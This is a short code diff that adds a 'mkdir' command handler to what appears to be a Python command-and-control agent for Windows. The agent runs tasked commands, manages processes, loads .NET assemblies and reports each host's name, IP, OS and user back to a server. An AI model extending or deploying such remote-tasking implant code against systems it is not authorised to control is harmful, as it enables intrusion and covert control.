@@ -25,8 +25,9 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.ps import list_processes, grep_processes, terminate_process
     from utils.winapi.run import run_process
     from utils.winapi.netexec import load_dotnet_assembly
-    from utils.winapi.hostname import get_hostname  # Import the new hostname module
-    from utils.winapi.nslookup import nslookup  # Import the new nslookup module
+    from utils.winapi.hostname import get_hostname 
+    from utils.winapi.nslookup import nslookup
+    from utils.winapi.mkdir import mkdir
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -174,6 +175,17 @@ def execute_commands():
                     result = ls(path)
                     status = 'Completed'
                     output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('mkdir'):
+                try:
+                    path = command_text.split(' ', 1)[1]
+                    result = mkdir(path)
+                    status = 'Completed'
+                    output = result
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
